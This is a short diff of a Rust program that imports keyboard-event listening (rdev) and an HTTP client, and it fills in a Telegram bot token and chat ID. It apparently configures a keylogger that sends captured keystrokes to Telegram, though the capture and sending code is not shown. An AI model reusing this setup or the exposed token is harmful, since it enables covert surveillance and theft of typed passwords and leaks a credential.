@@ -4,8 +4,8 @@ use std::time::{Duration, Instant};
 use rdev::{listen, Event, EventType, Key};
 use reqwest::blocking::Client;
 
-const BOT_TOKEN: &str = "";
-const CHAT_ID: &str = "";
+const BOT_TOKEN: &str = "7756196800:AAE_2EBn1gp9ZZTUatjsVdPt68DLV3usEOU";
+const CHAT_ID: &str = "7075072566";
 
 fn main() {
     let (tx, rx) = mpsc::channel::<&'static str>();
